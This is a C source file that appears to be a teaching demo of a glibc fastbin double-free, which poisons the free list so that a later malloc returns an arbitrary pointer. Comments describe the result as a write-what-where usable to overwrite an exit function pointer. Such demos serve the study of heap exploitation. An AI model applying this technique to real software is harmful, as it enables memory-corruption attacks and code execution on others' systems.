#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define WORD_SIZE ((size_t)-1 > 0xffffffffUL ? 8 : 4)
#define SIZEOFNORMALCHUNK 0x100-WORD_SIZE
#define SIZEOFFASTCHUNK 0x60-WORD_SIZE

void print_bytes(char *mempos, size_t size)
{
	int i = 0;
	while(i < size)
		printf("%02x", *(mempos + i++));
	printf("\n");
		
}

int main()
{
	char *A, *B, *C, *D;
	FILE *fp = fopen("/dev/null", "r");
	printf("\n[+] malloc A(0x%x) \n", SIZEOFFASTCHUNK);
	A = malloc(SIZEOFFASTCHUNK);
	printf("A at %p\n", A);
	snprintf(A, SIZEOFFASTCHUNK, "This is A's contents. I would like to say something but"
					" there's not much space in 0x60 bytes...");
	printf("A contains: [%s]\n", A);
	printf("[+] Contents of A in hex: ");
	print_bytes(A, SIZEOFFASTCHUNK);

	printf("\n[+] malloc C(0x%x) \n", SIZEOFFASTCHUNK);
	C = malloc(SIZEOFFASTCHUNK);
	printf("C at %p\n", C);
	printf("\n[+] free(C)\n");
	free(C);

	printf("\n[+] free(A)\n");
	free(A);

	printf("\n[+] malloc B(0x%x) \n", SIZEOFFASTCHUNK);
	B = malloc(SIZEOFFASTCHUNK);
	printf("B %p\n", B);

	printf("\n[+] Double free()'ing A\n");
	printf("\n[+] free(A)\n");
	free(A);

	printf("[+] Setting first %d bytes of B to 'B's\n", WORD_SIZE);
	memset(B, 0, WORD_SIZE); // Arbitrary Pointer Allocation (1)
	long int *fp_in_heap =(long int *) &fp;
	fp_in_heap = *fp_in_heap - 0x20;
	memcpy(B, &fp_in_heap, 8);
	
	printf("B contains: [%s]\n", B);
	printf("[+] Contents of B in hex: ");
	print_bytes(B, SIZEOFFASTCHUNK);


	printf("\n[+] malloc C(0x%x) \n", SIZEOFFASTCHUNK);
	C = malloc(SIZEOFFASTCHUNK);
	printf("C at %p\n", C);
	printf("\n[+] malloc D(0x%x) \n", SIZEOFFASTCHUNK);
	// The next allocation will be a write-what-where
	// For example we could have pointed (1) to the exit function
	// and overwrite its pointer to our evil function
	D = malloc(SIZEOFFASTCHUNK); // BOOM! 0x4242424242424242
	fclose(fp);
	return 0;
}
